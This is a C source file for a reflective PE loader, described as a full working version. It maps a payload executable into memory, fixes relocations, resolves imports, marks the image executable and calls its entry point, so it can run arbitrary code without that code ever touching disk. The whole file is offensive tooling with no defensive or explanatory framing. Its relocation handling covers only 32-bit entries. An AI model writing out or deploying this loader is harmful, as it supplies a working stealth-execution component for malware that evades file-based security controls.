// reflective_loader.c - Full working version
#include "reflective_loader.h"
#include <windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

DWORD ReflectiveLoader(LPVOID lpPayload, DWORD dwPayloadSize) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpPayload;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)lpPayload + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return 0;

    // Allocate memory for the image
    SIZE_T imageSize = pNt->OptionalHeader.SizeOfImage;
    PVOID pImageBase = VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pImageBase) return 0;

    // Copy headers
    memcpy(pImageBase, lpPayload, pNt->OptionalHeader.SizeOfHeaders);

    // Copy sections
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSection->SizeOfRawData) {
            memcpy((BYTE*)pImageBase + pSection->VirtualAddress,
                   (BYTE*)lpPayload + pSection->PointerToRawData,
                   pSection->SizeOfRawData);
        }
        pSection++;
    }

    // Process relocations
    DWORD_PTR delta = (DWORD_PTR)pImageBase - pNt->OptionalHeader.ImageBase;
    if (delta) {
        PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pImageBase + 
            pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (pReloc->VirtualAddress) {
            WORD *pFix = (WORD*)((BYTE*)pReloc + sizeof(IMAGE_BASE_RELOCATION));
            for (int j = 0; j < (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2; j++) {
                if (pFix[j] >> 12 == IMAGE_REL_BASED_HIGHLOW) {
                    DWORD_PTR *pPatch = (DWORD_PTR*)((BYTE*)pImageBase + pReloc->VirtualAddress + (pFix[j] & 0xFFF));
                    *pPatch += delta;
                }
            }
            pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pReloc + pReloc->SizeOfBlock);
        }
    }

    // Process imports
    PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)pImageBase +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    while (pImport->Name) {
        char *pDllName = (char*)((BYTE*)pImageBase + pImport->Name);
        HMODULE hModule = LoadLibraryA(pDllName);
        if (!hModule) hModule = GetModuleHandleA(pDllName);
        PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((BYTE*)pImageBase + pImport->FirstThunk);
        PIMAGE_THUNK_DATA pOrgThunk = (PIMAGE_THUNK_DATA)((BYTE*)pImageBase + pImport->OriginalFirstThunk);
        if (!pOrgThunk) pOrgThunk = pThunk;
        while (pOrgThunk->u1.AddressOfData) {
            FARPROC pFunc = NULL;
            if (pOrgThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                pFunc = GetProcAddress(hModule, (LPCSTR)(pOrgThunk->u1.Ordinal & 0xFFFF));
            } else {
                PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)pImageBase + pOrgThunk->u1.AddressOfData);
                pFunc = GetProcAddress(hModule, pName->Name);
            }
            if (pFunc) pThunk->u1.Function = (ULONG_PTR)pFunc;
            pThunk++; pOrgThunk++;
        }
        pImport++;
    }

    // Apply memory protection (RX)
    DWORD oldProtect;
    VirtualProtect(pImageBase, imageSize, PAGE_EXECUTE_READ, &oldProtect);
    FlushInstructionCache(GetCurrentProcess(), pImageBase, imageSize);

    // Call entry point
    DWORD (*entryPoint)(void) = (DWORD(*)(void))((BYTE*)pImageBase + pNt->OptionalHeader.AddressOfEntryPoint);
    return entryPoint();
}